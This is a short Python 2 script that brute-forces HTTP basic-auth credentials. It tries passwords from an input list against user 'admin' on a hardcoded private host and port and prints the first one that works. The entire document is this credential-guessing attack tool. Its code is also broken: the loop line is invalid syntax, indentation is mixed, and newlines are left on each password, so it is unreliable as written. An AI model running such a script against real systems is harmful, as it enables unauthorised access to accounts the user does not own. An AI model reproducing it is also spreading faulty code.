#!/usr/bin/python2

import sys, urllib2, fileinput

User='admin'
Target='192.168.1.100'
Port='8082'

output = 'ALL FAILED' # default output

for i in File=fileinput.input():
   url = 'http://'+User+':'+i+'@'+Target+':'+Port
   try:
      if urllib2.urlopen(url):
	 output = User+' :: '+i
	 break
   except urllib2.URLError:
      continue

print(output)
